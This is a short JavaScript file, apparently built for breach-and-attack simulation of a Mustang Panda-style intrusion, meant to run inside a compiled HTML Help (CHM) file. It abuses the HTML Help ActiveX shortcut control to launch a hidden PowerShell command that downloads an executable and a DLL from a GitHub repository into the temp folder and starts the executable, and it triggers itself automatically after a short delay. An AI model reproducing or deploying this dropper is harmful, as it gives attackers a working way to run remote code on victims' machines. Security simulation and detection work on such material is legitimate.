// music.js - Clean version for CHM

alert("music.js loaded successfully!");

try {
    var obj = document.createElement("object");
    obj.setAttribute("classid", "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11");
    
    var cmd = ",powershell.exe,-NoProfile -WindowStyle Hidden -Command ";
    cmd += "\"$t=$env:TEMP; ";
    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe' -OutFile '$t\\wmpshare.exe'; ";
    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll' -OutFile '$t\\wmp.dll'; ";
    cmd += "Start-Process '$t\\wmpshare.exe'\"";

    obj.innerHTML = 
        '<param name="Command" value="ShortCut">' +
        '<param name="Item1" value="' + cmd + '">' +
        '<param name="Item2" value="273,1,1">';

    document.body.appendChild(obj);
    
    setTimeout(function(){
        obj.Click();
        alert("✅ Downloading EXE + DLL and executing...");
    }, 700);

} catch(e) {
    alert("Error: " + e.message);
}
